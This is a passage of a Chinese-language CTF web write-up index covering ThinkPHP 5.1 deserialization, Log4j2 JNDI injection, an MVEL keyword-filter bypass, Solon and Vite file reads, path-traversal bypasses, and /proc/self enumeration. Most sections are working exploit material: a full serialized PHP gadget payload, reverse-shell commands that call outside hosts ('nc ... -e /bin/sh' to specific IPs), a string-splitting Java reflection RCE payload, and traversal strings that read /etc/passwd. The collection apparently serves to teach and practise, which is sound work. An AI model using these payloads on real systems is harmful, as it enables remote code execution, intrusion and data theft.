<p>\u4e0b\u8f7d\u6e90\u4ee3\u7801\u540e\u89e3\u538b\u7f29\uff0c\u901a\u8fc7\u9605\u8bfb <code>readme.md</code> \u53d1\u73b0\u662f thinkphp 5.1 \u7248\u672c</p> <p>\u7f51\u4e0a\u641c\u7d22\u540e\uff0c\u5f97\u5230\u5229\u7528\u94fe thinkphp_5.1_exp.php \u6587\u4ef6\uff0c\u53ea\u9700\u6267\u884c <code>php thinkphp_5.1_exp.php</code>\uff0c\u4fbf\u53ef\u4ee5\u5f97\u5230 payload</p> <p>\u5173\u4e8e\u5229\u7528\u94fe\u7684\u6784\u9020\u7f51\u4e0a\u5f88\u591a\u5927\u795e\u5206\u6790\u4e86\uff0c\u53ef\u4ee5\u770b Thinkphp 5.1 \u53cd\u5e8f\u5217\u5316\u5229\u7528\u94fe\u6df1\u5165\u5206\u6790\uff0c\u6211\u5c31\u4e0d\u5206\u6790\u4e86\uff0c\u91cd\u70b9\u8bb2\u4e0b\u505a\u9898</p> <p>payload \u5185\u5bb9\u5982\u4e0b\uff1a</p> <pre><code>O:27:\"think\\process\\pipes\\Windows\":1:{s:34:\"?think\\process\\pipes\\Windows?files\";a:1:{i:0;O:17:\"think\\model\\Pivot\":2:{s:9:\"?*?append\";a:1:{s:1:\"a\";a:1:{i:0;s:0:\"\";}}s:17:\"?think\\Model?data\";a:1:{s:1:\"a\";O:13:\"think\\Request\":3:{s:7:\"?*?hook\";a:1:{s:7:\"visible\";a:2:{i:0;r:8;i:1;s:6:\"isAjax\";}}s:9:\"?*?filter\";s:6:\"system\";s:9:\"?*?config\";a:1:{s:8:\"var_ajax\";s:0:\"\";}}}}}}\n</code></pre> <p>\u8fd9\u91cc\u5206\u6790\u4e00\u4e0b thinkphp \u7684 2 \u4e2a\u4e3b\u8981\u6587\u4ef6</p> <p><code>application\\index\\controller\\index.php</code> \u6587\u4ef6,\u53ea\u6709\u8bf7\u6c42\u88ab hello \u89e3\u6790\u65f6\uff0c\u624d\u80fd\u901a\u8fc7\u6784\u9020 POST \u8bf7\u6c42\u5c06 payload \u8d4b\u503c</p> <p>\u7ed9 str\uff0c\u5b9e\u73b0\u53cd\u5e8f\u5217\u5316\u5229\u7528</p> <pre><code>&lt;?php\nnamespace app\\index\\controller;\n\nclass Index\n{\n   public function index()\n   {\n      return \"&lt;a href='www.zip'&gt;download code&lt;/a&gt;\";\n   }\n\n   public function hello()\n   {\n      unserialize($_POST['str']);\n   }\n}\n</code></pre> <p><code>route\\route.php</code> \u6587\u4ef6\uff0c\u538b\u7f29\u5305\u6e90\u4ee3\u7801\u4e0e\u5b9e\u9645 BUUCTF \u670d\u52a1\u5668\u4ee3\u7801\u4e0d\u4e00\u6837</p> <p>\u538b\u7f29\u5305\u4ee3\u7801\u5982\u4e0b</p> <pre><code>&lt;?php\n// \u5f53\u7528\u6237\u8bbf\u95ee URL \u8def\u5f84 /think \u65f6\n// \u6267\u884c\u4e00\u4e2a\u533f\u540d\u51fd\u6570\uff08\u95ed\u5305\uff09\n// \u51fd\u6570\u8fd4\u56de\u5b57\u7b26\u4e32 'hello,ThinkPHP5!'\n// \u8fd9\u4e2a\u54cd\u5e94\u4f1a\u76f4\u63a5\u8fd4\u56de\u7ed9\u5ba2\u6237\u7aef\nRoute::get('think', function () {\n   return 'hello,ThinkPHP5!';\n});\n\n// \u5f53\u7528\u6237\u8bbf\u95ee\u7c7b\u4f3c /hello/John \u8fd9\u6837\u7684 URL \u65f6\n// :name \u662f\u4e00\u4e2a\u8def\u7531\u53c2\u6570\uff0c\u53ef\u4ee5\u5339\u914d\u4efb\u4f55\u503c\uff08\u8fd9\u91cc\u662f \"John\"\uff09\n// \u8bf7\u6c42\u4f1a\u88ab\u8def\u7531\u5230 index \u63a7\u5236\u5668\u7684 hello \u65b9\u6cd5\n// \u8def\u7531\u53c2\u6570 name \u4f1a\u4f5c\u4e3a\u53c2\u6570\u4f20\u9012\u7ed9\u8be5\u65b9\u6cd5\nRoute::get('hello/:name', 'index/hello');\nreturn [\n];\n</code></pre> <p>\u6839\u636e\u6e90\u4ee3\u7801\u6784\u9020\u4e86\u4e24\u79cd url \u8bf7\u6c42\uff0c\u4ee5 <code>whoami</code> \u4e3a\u4f8b\u5b50</p> <p>\u7b2c\u4e00\u4e2a\u8bf7\u6c42\u8def\u7531\u4e3a <code>application\\index\\controller\\index.php</code> \u6587\u4ef6 -&gt; <code>Index</code> \u7c7b -&gt; <code>hello()</code> \u65b9\u6cd5</p> <pre><code>http://{your_server}/public/index.php/index/Index/hello?a=whoami\n</code></pre> <p></p> <p>\u7b2c\u4e8c\u4e2a\u8bf7\u6c42\u5229\u7528\u4e86 thinkphp \u7684\u517c\u5bb9\u6a21\u5f0f url</p> <pre><code>http://{your_server}/public/index.php?s=index/index/hello&amp;a=whoami\n</code></pre> <p></p> <p>\u4ecb\u7ecd\u5b8c\u672c\u673a\u547d\u4ee4\u6267\u884c\uff0c\u518d\u6765\u4ecb\u7ecd BUUCTF \u547d\u4ee4\u6267\u884c\u3002\u670d\u52a1\u5668\u53ea\u80fd\u7528\u7b2c\u4e8c\u79cd\u8bf7\u6c42</p> <p>\u6784\u9020\u53c2\u6570 <code>a=cd /;ls</code> \u548c <code>a=cd /;cat FLAG</code>\uff0c<code>str</code> \u7684\u503c\u4e3a 1 \u4e2d payload\uff0c\u901a\u8fc7 <code>hackbar</code> \u6216 <code>burpsuite</code> \u53d1\u5305</p> <p></p> <p></p>"},{"location":"Web/Chapter21/21-1/","title":"Apache Log4j2 RCE","text":""},{"location":"Web/Chapter21/21-1/#apache-log4j2-rce","title":"Apache Log4j2 RCE","text":"<p>\u4e0b\u8f7d\u8fd9\u4e2a\u6f0f\u6d1e\u5229\u7528\u5de5\u5177</p> <p></p> <p>\u6839\u636e\u9898\u76ee\u63cf\u8ff0\u6784\u9020 payload</p> <p>\u5f53\u76ee\u6807\u670d\u52a1\u5668\u89e6\u53d1 JNDI \u6ce8\u5165\u6f0f\u6d1e\u65f6\uff0c\u4f1a\u6267\u884c\u8be5\u547d\u4ee4\uff0c\u5411\u653b\u51fb\u8005\u7684 <code>113.45.17.228:9897</code> \u53d1\u9001\u4e00\u4e2a\u53cd\u5411 Shell</p> <pre><code>java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C \"nc 113.45.17.228 9897 -e /bin/sh\" -A 113.45.17.228\n</code></pre> <p></p> <p>\u751f\u6210\u4e86\u4e94\u4e2a\u6076\u610f\u7684 JNDI \u94fe\u63a5</p> <p>\u7ecf\u6d4b\u8bd5 JDK 1.8 \u7684\u53ef\u4ee5</p> <pre><code>${jndi:ldap://113.45.17.228:1389/tt6z0a}\n</code></pre> <p></p> <p>\u5728 VPS \u4e0a\u76d1\u542c\u7aef\u53e3 <code>9897</code></p> <pre><code>nc -n -lvvp 9897\n# -n\uff1a\u7981\u7528 DNS \u89e3\u6790\n# -l\uff1a\u76d1\u542c\u6a21\u5f0f\uff0c\u7b49\u5f85\u8fde\u63a5\n# -vv\uff1a\u8be6\u7ec6\u8f93\u51fa\n# -p\uff1a\u6307\u5b9a\u7aef\u53e3\n</code></pre> <p></p>"},{"location":"Web/Chapter22/22-1/","title":"RCE \u5b57\u7b26\u4e32\u62fc\u63a5\u7ed5\u8fc7","text":""},{"location":"Web/Chapter22/22-1/#rce-\u5b57\u7b26\u4e32\u62fc\u63a5\u7ed5\u8fc7","title":"RCE \u5b57\u7b26\u4e32\u62fc\u63a5\u7ed5\u8fc7","text":"<p>\u6253\u5f00\u9875\u9762\u53ea\u6709\u8fd9\u4e00\u4e2a\u529f\u80fd\u53ef\u7528</p> <p></p> <p>\u5728 Burp \u4e2d\u53d1\u73b0\u54cd\u5e94\u6709\u4e2a <code>source</code></p> <p></p> <p>\u8bbf\u95ee\u62ff\u5230\u6e90\u7801</p> <p></p> <p>\u4f7f\u7528 <code>@RestController</code> \u6ce8\u89e3\uff0c\u8868\u793a\u8fd9\u662f\u4e00\u4e2a Spring MVC \u63a7\u5236\u5668\uff0c\u8fd4\u56de\u503c\u4f1a\u81ea\u52a8\u8f6c\u6362\u4e3a JSON \u54cd\u5e94</p> <pre><code>@RestController\npublic class MVELTest {\n    // \u7c7b\u5185\u5bb9\n}\n</code></pre> <p>\u521d\u59cb\u5316\u4e00\u4e2a <code>Setting</code> \u5bf9\u8c61\uff0c\u5305\u542b\u9ed8\u8ba4\u7684 IP \u5217\u8868\u548c\u6570\u5b57\u53c2\u6570 6</p> <pre><code>private Setting setting = new Setting(\"['115.195.167.159', '115.195.167.159', '164.90.230.201', '174.87.232.68']\", 6);\n</code></pre> <p>\u5904\u7406 POST \u8bf7\u6c42\uff0c\u8def\u5f84\u4e3a <code>/updateSysSetting</code></p> <p>\u63a5\u6536 JSON \u683c\u5f0f\u7684 <code>Setting</code> \u5bf9\u8c61\u4f5c\u4e3a\u8bf7\u6c42\u4f53</p> <p>\u8fd4\u56de JSON \u54cd\u5e94\uff0c\u5b57\u7b26\u7f16\u7801\u4e3a UTF-8</p> <pre><code>@PostMapping(value = \"/updateSysSetting\", produces = \"application/json;charset=UTF-8\")\npublic ResponseObj updateSysSetting(@RequestBody Setting [ES], HttpServletResponse response) {\n    // \u65b9\u6cd5\u5b9e\u73b0\n}\n</code></pre> <p>\u4f7f\u7528\u6b63\u5219\u8868\u8fbe\u5f0f\u68c0\u6d4b\u4f20\u5165\u7684\u8868\u8fbe\u5f0f\u662f\u5426\u5305\u542b\u5371\u9669\u5173\u952e\u8bcd\uff08\u5982 Runtime\u3001Process \u7b49\uff09</p> <p>\u5982\u679c\u68c0\u6d4b\u5230\u6076\u610f\u4ee3\u7801\uff0c\u8fd4\u56de 483 \u72b6\u6001\u7801\u548c\u9519\u8bef\u4fe1\u606f</p> <pre><code>if (Pattern.matches(\"\"{?i}.*(system[Runtime|Process|Thread|Lookup|http|Socket|restTemplate|MVEL|flag].*\", [ES].getExp()) {\n    response.setStatus(483);\n    return new ResponseObj(false, \"\u8868\u8fbe\u5f0f\u5305\u542b\u6076\u610f\u4ee3\u7801\", \"\");\n}\n</code></pre> <p>\u4f7f\u7528 MVEL \u5f15\u64ce\u6267\u884c\u4f20\u5165\u7684\u8868\u8fbe\u5f0f</p> <p>\u6355\u83b7\u5e76\u5904\u7406\u6267\u884c\u8fc7\u7a0b\u4e2d\u7684\u5f02\u5e38</p> <pre><code>try {\n    result = MVEL.expl(res.getExp());\n    System.out.println(result.toString());\n} catch (Exception e) {\n    response.setStatus(580);\n    return new ResponseObj(false, \"\u8868\u8fbe\u5f0f\u8bed\u6cd5\u9519\u8bef\", e.getMessage());\n}\n</code></pre> <p>\u5c1d\u8bd5\u5c06\u7ed3\u679c\u8f6c\u6362\u4e3a <code>List&lt;String&gt;</code>\uff08IP \u5217\u8868\uff09</p> <p>\u5982\u679c\u8f6c\u6362\u5931\u8d25\uff0c\u8fd4\u56de 580 \u72b6\u6001\u7801\u548c\u9519\u8bef\u4fe1\u606f</p> <pre><code>try {\n    allowedIP = (List&lt;String&gt;) result;\n} catch (Exception e) {\n    response.setStatus(580);\n    return new ResponseObj(false, \"\u8868\u8fbe\u5f0f\u8fd4\u56de\u503c\u4e0d\u662fIP\u5217\u8868\", e.getMessage());\n}\n</code></pre> <p>\u5206\u6790\u5b8c\u6bd5\u540e\u6211\u4eec\u53ef\u4ee5\u5229\u7528 Java \u7684\u53cd\u5c04\u673a\u5236\u6765 RCE</p> <pre><code>{\n\"exp\": \"''.getClass().forName('java.lang.Run'+'time').getMethod('exec',''.getClass()).invoke(''.getClass().forName('java.lang.Run'+'time').getMethod('getRu'+'ntime').invoke(null),'nc 144.34.162.13 6666 -e /bin/sh'))\",\n\"limit\": \"60\"\n}\n</code></pre> <p>\u4e0b\u9762\u6765\u89e3\u6790\u4e0b\u8fd9\u6bb5 payload</p> <pre><code>// ''.getClass(): \u83b7\u53d6\u7a7a\u5b57\u7b26\u4e32\u7684 Class \u5bf9\u8c61\n''.getClass().forName('java.lang.Run'+'time')   // .forName('java.lang.Run'+'time'): \u52a8\u6001\u52a0\u8f7d java.lang.Runtime \u7c7b\u5e76\u8fd4\u56de\u5176 Class \u5bf9\u8c61\n  .getMethod('exec',''.getClass())  // \u83b7\u53d6 Runtime.exec(String) \u65b9\u6cd5\u7684 Method \u5bf9\u8c61\n  .invoke(\n    ''.getClass().forName('java.lang.Run'+'time')   // \u518d\u6b21\u83b7\u53d6 Runtime \u7c7b\n      .getMethod('getRu'+'ntime')   // \u83b7\u53d6\u9759\u6001\u65b9\u6cd5 getRuntime()\n      .invoke(null),    // \u8c03\u7528\u8be5\u65b9\u6cd5\uff08invoke(null) \u56e0\u4e3a\u8fd9\u662f\u9759\u6001\u65b9\u6cd5\uff09,\u8fd4\u56de Runtime \u7c7b\u7684\u5355\u4f8b\u5b9e\u4f8b\n    'nc 144.34.162.13 6666 -e /bin/sh'  // \u4f7f\u7528\u524d\u9762\u83b7\u53d6\u7684 exec \u65b9\u6cd5\uff0c\u5728 Runtime \u5b9e\u4f8b\u4e0a\u6267\u884c\u547d\u4ee4\n  )\n</code></pre> <p>\u53d1\u9001 payload</p> <p></p> <p>\u76d1\u542c\u7aef\u53e3\u62ff\u5230 flag</p> <p></p>"},{"location":"Web/Chapter22/22-2/","title":"Solon \u6846\u67b6\u4efb\u610f\u6587\u4ef6\u8bfb\u53d6","text":""},{"location":"Web/Chapter22/22-2/#solon-\u6846\u67b6\u4efb\u610f\u6587\u4ef6\u8bfb\u53d6","title":"Solon \u6846\u67b6\u4efb\u610f\u6587\u4ef6\u8bfb\u53d6","text":"<p>\u53cd\u7f16\u8bd1\u9898\u76ee\u7ed9\u7684\u9644\u4ef6</p> <p></p> <p><code>Solon.start(...)</code>\uff1a\u542f\u52a8 Solon \u6846\u67b6\u7684\u5e94\u7528\u7a0b\u5e8f</p> <p><code>(Class&lt;?&gt;) App.class</code>\uff1a\u4f20\u5165\u5f53\u524d\u7c7b\u7684\u5b57\u8282\u7801\u5bf9\u8c61\uff0c\u6307\u5b9a\u542f\u52a8\u7c7b</p> <p><code>args</code>\uff1a\u4f20\u5165\u547d\u4ee4\u884c\u53c2\u6570</p> <p><code>(ConsumerEx&lt;SolonApp&gt;) app -&gt; {...}</code>\uff1a\u8fd9\u662f\u4e00\u4e2a lambda \u8868\u8fbe\u5f0f\uff0c\u7528\u4e8e\u4f20\u5165\u542f\u52a8\u540e\u5bf9 <code>SolonApp</code> \u7684\u914d\u7f6e</p> <pre><code>Solon.start((Class&lt;?&gt;) App.class, args, (ConsumerEx&lt;SolonApp&gt;) app -&gt; {\n</code></pre> <p><code>StaticMappings.add(...)</code>\uff1a\u5c06\u4e00\u4e2a URL \u8def\u5f84\u524d\u7f00\u6620\u5c04\u5230\u5b9e\u9645\u7684\u672c\u5730\u76ee\u5f55\u8def\u5f84\uff0c\u7528\u4e8e\u5904\u7406\u9759\u6001\u8d44\u6e90\uff08\u5982 CSS\u3001JS\u3001\u56fe\u7247\uff09</p> <p><code>\"/assets/\"</code>\uff1a\u8bf7\u6c42\u8def\u5f84\u4ee5 <code>/assets/</code> \u5f00\u5934\u65f6\uff0c\u5c06\u6620\u5c04\u5230\u672c\u5730\u8def\u5f84</p> <p><code>new FileStaticRepository(\"/app/assets\")</code>\uff1a\u8868\u793a\u672c\u5730\u6587\u4ef6\u7cfb\u7edf\u4e2d <code>/app/assets</code> \u76ee\u5f55\u5c06\u88ab\u7528\u6765\u63d0\u4f9b\u9759\u6001\u8d44\u6e90</p> <pre><code>StaticMappings.add(\"/assets/\", new FileStaticRepository(\"/app/assets\"));\n</code></pre> <p>\u53bb\u770b\u770b\u8fd9\u4e2a <code>FileStaticRepository</code></p> <p></p> <p><code>FileStaticRepository</code> \u662f\u4e00\u4e2a\u5b9e\u73b0\u4e86 <code>StaticRepository</code> \u63a5\u53e3\u7684\u7c7b</p> <p><code>StaticRepository</code> \u662f\u6765\u81ea <code>org.noear.solon.web.staticfiles</code> \u5305\u7684\u63a5\u53e3\uff0c\u5b9a\u4e49\u4e86\u4e00\u4e2a\u9759\u6001\u8d44\u6e90\u4ed3\u5e93\u7684\u67e5\u627e\u89c4\u8303</p> <pre><code>public class FileStaticRepository implements StaticRepository {\n</code></pre> <p><code>location</code> \u8868\u793a\u6587\u4ef6\u7cfb\u7edf\u4e2d\u7684\u57fa\u7840\u76ee\u5f55\u8def\u5f84\uff08\u9759\u6001\u8d44\u6e90\u7684\u6839\u76ee\u5f55\uff09</p> <pre><code>String location;\n</code></pre> <p>\u6784\u9020\u5668\u4f20\u5165 <code>location</code> \u53c2\u6570</p> <p>\u8c03\u7528\u4e86 <code>setLocation()</code> \u65b9\u6cd5\u8bbe\u7f6e\u6587\u4ef6\u6839\u76ee\u5f55</p> <pre><code>public FileStaticRepository(String location) {\n    setLocation(location);\n}\n</code></pre> <p>\u4fdd\u62a4\u7ea7\u522b\uff08<code>protected</code>\uff09\u7684\u65b9\u6cd5</p> <p>\u5982\u679c\u4f20\u5165\u7684\u8def\u5f84\u4e3a <code>null</code>\uff0c\u5219\u4e0d\u8bbe\u7f6e</p> <p>\u5426\u5219\u66f4\u65b0\u7c7b\u4e2d\u7684 <code>location</code> \u6210\u5458\u53d8\u91cf</p> <pre><code>protected void setLocation(String location) {\n    if (location == null) {\n        return;\n    }\n    this.location = location;\n}\n</code></pre> <p>\u8fd9\u662f\u6700\u5173\u952e\u7684\u9759\u6001\u8d44\u6e90\u67e5\u627e\u903b\u8f91</p> <pre><code>@Override\npublic URL find(String relativePath) throws Exception {\n    // \u6784\u9020\u4e00\u4e2a\u6587\u4ef6\u5bf9\u8c61\uff0c\u76f8\u5f53\u4e8e\u62fc\u63a5\u8def\u5f84 location/relativePath\n    File file = new File(this.location, relativePath);\n    if (file.exists()) {\n        // \u5982\u679c\u5b58\u5728\uff0c\u5219\u8fd4\u56de\u8be5\u6587\u4ef6\u7684 URL\uff08Web \u6846\u67b6\u4f1a\u7528\u8fd9\u4e2a\u8fd4\u56de\u8d44\u6e90\uff09\n        return file.toURI().toURL();\n    }\n    return null;\n}\n</code></pre> <p>\u56e0\u4e3a\u8fd9\u4e2a\u53c2\u6570\u662f\u6211\u4eec\u53ef\u63a7\u7684\uff0c\u6240\u4ee5\u63a8\u6d4b\u5b58\u5728\u4efb\u610f\u6587\u4ef6\u8bfb\u53d6\u6f0f\u6d1e</p> <p>\u540c\u65f6\u627e\u5230\u4e86 <code>/backdoor</code> \u8def\u7531\uff0c\u5185\u5bb9\u5e94\u8be5\u4e0e flag \u76f8\u5173\uff0c\u4f46\u662f\u4e0d\u77e5\u9053 <code>realkey</code></p> <p></p> <pre><code>public class dashboard {\n    // realkey \u662f\u4e00\u4e2a\u9759\u6001\u5e38\u91cf\n    public static final String realkey = \"***********\";\n\n    // @Mapping(\"/\")\uff1a\u6620\u5c04\u7f51\u7ad9\u6839\u8def\u5f84\n    @Mapping(AntPathMatcher.DEFAULT_PATH_SEPARATOR)\n    public Object index() {\n        // ModelAndView \u662f Solon \u63d0\u4f9b\u7684\u7528\u4e8e\u8fd4\u56de\u9875\u9762\u6a21\u677f\u7684\u7c7b\n        // \u4f7f\u7528\u6a21\u677f\u5f15\u64ce\u6e32\u67d3 index.ftl\uff08FreeMarker \u6a21\u677f\uff09\n        ModelAndView vm = new ModelAndView(\"index.ftl\");\n        // \u8fd4\u56de\u540e\u5ba2\u6237\u7aef\u4f1a\u770b\u5230 index.ftl \u6e32\u67d3\u540e\u7684 HTML\n        return vm;\n    }\n\n    // \u6620\u5c04 /dashboard \u8bf7\u6c42\n    @Mapping(\"/dashboard\")\n    public Object dashboard() {\n        // \u6e32\u67d3\u5e76\u8fd4\u56de dashboard.ftl \u9875\u9762\u6a21\u677f\n        ModelAndView vm = new ModelAndView(\"dashboard.ftl\");\n        return vm;\n    }\n\n    // \u6620\u5c04 /backdoor \u8bf7\u6c42\n    // \u4ece\u8bf7\u6c42\u53c2\u6570\u4e2d\u63d0\u53d6 key \u53c2\u6570\n    @Mapping(\"/backdoor\")\n    public String backdoor(@Param(\"key\") String key) {\n        // \u5982\u679c key \u4e0e realkey\uff08\u4e5f\u5c31\u662f NlRVANA@007\uff09\u76f8\u7b49\uff0c\u5c31\u4ece\u73af\u5883\u53d8\u91cf\u4e2d\u53d6\u51fa FLAG\n        if (realkey.equals(key)) {\n            String flag = System.getenv(\"FLAG\");\n            return \"flag is \" + flag;\n        }\n        return \"you are god\";\n    }\n}\n</code></pre> <p>\u6ce8\u610f\u9898\u76ee\u521a\u5f00\u59cb\u7ed9\u51fa\u7684 <code>/app</code>\uff0c\u63a8\u6d4b\u53ef\u80fd\u5b58\u5728 <code>app.jar</code>\uff0c\u6784\u9020 payload</p> <pre><code>/assets/\u2026/app.jar\n</code></pre> <p></p> <p>\u53cd\u7f16\u8bd1\u4e0b\u8f7d\u7684\u6587\u4ef6\u62ff\u5230 <code>realkey</code></p> <p></p> <p>\u6210\u529f\u62ff\u5230 flag</p> <p></p>"},{"location":"Web/Chapter23/23-1/","title":"\u53cc\u5199\u7ed5\u8fc7","text":""},{"location":"Web/Chapter23/23-1/#\u53cc\u5199\u7ed5\u8fc7","title":"\u53cc\u5199\u7ed5\u8fc7","text":"<p>\u53d1\u73b0 <code>file</code> \u53c2\u6570\u662f\u6587\u4ef6\u540d\u5f62\u5f0f</p> <p></p> <p>\u5c1d\u8bd5\u76f4\u63a5\u8bfb\u53d6 <code>/etc/passwd</code> \u65e0\u679c</p> <pre><code>?file=../../../../../etc/passwd\n</code></pre> <p></p> <p>\u53cc\u5199\u53ef\u4ee5\u7ed5\u8fc7</p> <pre><code>?file=....//....//....//....//....//etc/passwd\n</code></pre> <p></p> <p>\u6362\u6210 <code>/flag</code> \u901a\u5173</p> <pre><code>?file=....//....//....//....//....//flag\n</code></pre> <p></p>"},{"location":"Web/Chapter23/23-2/","title":"JSP \u7f51\u7ad9\u654f\u611f\u6587\u4ef6\u904d\u5386\u8bfb\u53d6","text":""},{"location":"Web/Chapter23/23-2/#jsp-\u7f51\u7ad9\u654f\u611f\u6587\u4ef6\u904d\u5386\u8bfb\u53d6","title":"JSP \u7f51\u7ad9\u654f\u611f\u6587\u4ef6\u904d\u5386\u8bfb\u53d6","text":"<p>\u6253\u5f00\u7f51\u9875</p> <p></p> <p>\u70b9\u51fb\u63d0\u793a\uff0c\u7528 JSP \u5199\u7684\u7f51\u7ad9\uff0c\u7ed9\u7684\u662f\u4e00\u4e2a\u4e0b\u8f7d\u63a5\u53e3\uff0c\u9700\u8981 POST \u8bf7\u6c42</p> <p></p> <p>\u7f16\u5199\u811a\u672c\u904d\u5386\u4e00\u4e9b\u5e38\u89c1\u7684\u654f\u611f\u6587\u4ef6</p> <pre><code>import requests\n\ndef test_download(filename):\n    url = \"http://challenge.qsnctf.com:31930/DownloadServlet\"\n    headers = {\n        'Content-Type': 'application/x-www-form-urlencoded',\n        'Accept-Charset': 'UTF-8'\n    }\n    data = {'filename': filename}\n\n    response = requests.post(url, data=data, headers=headers)\n\n    print(f\"Testing {filename}\")\n    print(f\"Status: {response.status_code}\")\n    print(f\"Content-Type: {response.headers.get('Content-Type', 'Not Set')}\")\n\n    # \u5982\u679c\u662f class \u6587\u4ef6\uff0c\u4fdd\u5b58\u4e0b\u6765\n    if response.headers.get('Content-Type') == 'application/octet-stream':\n        filename_only = filename.split('/')[-1]\n        with open(filename_only, 'wb') as f:\n            f.write(response.content)\n        print(f\"Saved to {filename_only}\")\n\n    print(\"-\" * 50)\n\n# \u6d4b\u8bd5\u8def\u5f84\npaths = [\n    \"WEB-INF/classes/com/ctf/file/DownloadServlet.class\",\n    \"WEB-INF/classes/com/ctf/flag/FlagManager.class\",\n    \"WEB-INF/classes/com/ctf/flag/flag.txt\",\n    \"WEB-INF/classes/flag.txt\",\n    \"WEB-INF/classes/flag\",\n    \"../classes/com/ctf/flag/FlagManager.class\"\n]\n\nfor path in paths:\n    test_download(path)\n</code></pre> <p>\u53cd\u7f16\u8bd1\u4e0b\u8f7d\u7684 <code>FlagManager</code> \u6587\u4ef6</p> <p></p> <p>\u7f16\u5199\u811a\u672c\u89e3\u5bc6</p> <pre><code>key = [110, 107, 185, 183, 183, 186, 103, 185, 99, 105, 105, 187, 105, 99, 102, 184, 185, 103, 99, 108, 186, 107, 187, 99, 183, 109, 105, 184, 102, 106, 106, 188, 109, 186, 111, 188]\n\nflag = []\nfor k in key:\n    c = (k ^ 48) - ord('&amp;')\n    flag.append(chr(c))\n\nprint(''.join(flag))    # SQCTF{85caad1c-33e3-0bc1-6d5e-a73b044f7d9f}\n</code></pre>"},{"location":"Web/Chapter23/23-3/","title":"Vite \u4efb\u610f\u6587\u4ef6\u8bfb\u53d6\uff08CVE-2025-30208\uff09","text":""},{"location":"Web/Chapter23/23-3/#vite-\u4efb\u610f\u6587\u4ef6\u8bfb\u53d6cve-2025-30208","title":"Vite \u4efb\u610f\u6587\u4ef6\u8bfb\u53d6\uff08CVE-2025-30208\uff09","text":"<p>CVE-2025-30208 \u662f Vite \u5f00\u53d1\u670d\u52a1\u5668\u4e2d <code>@fs</code> \u529f\u80fd\u7684 \u6587\u4ef6\u7cfb\u7edf\u8bbf\u95ee\u63a7\u5236\u7ed5\u8fc7 \u6f0f\u6d1e</p> <p>\u653b\u51fb\u8005\u53ea\u9700\u5728\u8bf7\u6c42 URL \u4e2d\u8ffd\u52a0 <code>?raw??</code> \u6216 <code>?import&amp;raw??</code> \u7b49\u53c2\u6570</p> <p>\u5373\u53ef\u7ed5\u8fc7 <code>server.fs.deny</code> \u9650\u5236\uff0c\u8bfb\u53d6\u4efb\u610f\u6587\u4ef6\u5185\u5bb9\uff0c\u5305\u62ec\u9879\u76ee\u6839\u76ee\u5f55\u5916\u7684\u654f\u611f\u6587\u4ef6</p> <pre><code>/@fs/flag?raw??\n</code></pre> <p></p>"},{"location":"Web/Chapter23/23-4/","title":"/proc/self/ \u83b7\u53d6\u5f53\u524d\u8fdb\u7a0b\u76f8\u5173\u4fe1\u606f","text":""},{"location":"Web/Chapter23/23-4/#procself-\u5f53\u524d\u8fdb\u7a0b\u4fe1\u606f\u5229\u7528","title":"/proc/self/ \u5f53\u524d\u8fdb\u7a0b\u4fe1\u606f\u5229\u7528","text":"<p>\u8bbf\u95ee\u73af\u5883\uff0c\u4efb\u610f\u8f93\u5165 <code>ls</code></p> <p></p> <p>\u7f51\u9875\u5c06\u6211\u4eec\u7684\u8f93\u5165\u503c ls \u6253\u5370\u51fa\u6765\uff0c\u53ef\u80fd\u5b58\u5728\u6a21\u677f\u6ce8\u5165</p> <p></p> <p>\u8fdb\u4e00\u6b65\u8fdb\u5165 article \u754c\u9762\uff0c\u6d4b\u8bd5 flag\uff0c\u6a21\u677f\u6ce8\u5165 <code>{{1+2}}</code></p> <p></p> <p></p> <p>\u6ce8\u610f\u5230\u8f93\u5165\u4e3a <code>{{1+2}}</code> \u65f6\u7ed9\u51fa\u4e86\u8def\u5f84</p> <p></p> <p>\u5f00\u59cb\u5c1d\u8bd5\u8def\u5f84\u7a7f\u8d8a <code>../../../../../../../etc/passwd</code>\uff0c\u83b7\u5f97 passwd \u6587\u4ef6\u503c</p> <p></p> <p>\u5229\u7528 <code>/proc/self/environ</code> \u83b7\u53d6\u5f53\u524d\u7a0b\u5e8f\u7684\u73af\u5883\u53d8\u91cf</p> <p>\u731c\u6d4b flag \u5b58\u5728\u4e8e <code>/home/sssssserver/flag</code>\uff0c\u4f46\u662f\u8fd8\u662f\u663e\u793a\u65e0\u6743\u9650</p> <p></p> <p>\u5229\u7528 <code>/proc/self/cmdline</code> \u83b7\u53d6\u5f53\u524d\u7a0b\u5e8f\u547d\u4ee4\u884c\u8bb0\u5f55\uff0c\u53d1\u73b0 <code>python server.py</code> \u547d\u4ee4\uff0c\u5178\u578b\u7684\u4f7f\u7528\u4e86 flask \u6216 Django</p> <p></p> <p>\u8fdb\u4e00\u6b65\u5229\u7528 <code>/proc/self/cwd</code> \u83b7\u53d6\u5f53\u524d\u8fdb\u7a0b\u76ee\u5f55\uff0c\u901a\u8fc7 <code>/proc/self/cwd/server.py</code> \u5f97\u5230\u6e90\u7801 <code>server.py</code></p> <pre><code># \u5bfc\u5165\u5fc5\u8981\u7684\u6a21\u5757\nimport os \n# Flask\u6838\u5fc3\u6a21\u5757\nfrom flask import (\n    Flask,\n    render_template,  # \u6e32\u67d3\u6a21\u677f\u6587\u4ef6\n    request,          # \u5904\u7406HTTP\u8bf7\u6c42\n    url_for,          # URL\u751f\u6210\n    redirect,         # \u91cd\u5b9a\u5411\n    session,          # \u4f1a\u8bdd\u7ba1\u7406\n    render_template_string  # \u4ece\u5b57\u7b26\u4e32\u6e32\u67d3\u6a21\u677f\uff08\u5371\u9669\u64cd\u4f5c\uff01\uff09\n)\nfrom flask_session import Session  # \u670d\u52a1\u5668\u7aef\u4f1a\u8bdd\u5b58\u50a8\n\n# \u521d\u59cb\u5316Flask\u5e94\u7528\napp = Flask(__name__)\n\n# !!! \u9ad8\u5371\u5b89\u5168\u8b66\u544a !!!\n# \u4f7f\u7528execfile\u52a8\u6001\u6267\u884c\u5916\u90e8Python\u6587\u4ef6\n# \u5b89\u5168\u9690\u60a3\uff1a\u53ef\u80fd\u6267\u884c\u6076\u610f\u4ee3\u7801\uff0c\u5e94\u8be5\u6539\u7528\u5e38\u89c4\u5bfc\u5165\u65b9\u5f0f\nexecfile('flag.py')  # \u52a0\u8f7dflag.py\u6587\u4ef6\uff0c\u9884\u671f\u5b9a\u4e49flag\u53d8\u91cf\nexecfile('key.py')   # \u52a0\u8f7dkey.py\u6587\u4ef6\uff0c\u9884\u671f\u5b9a\u4e49key\u53d8\u91cf\n\n# 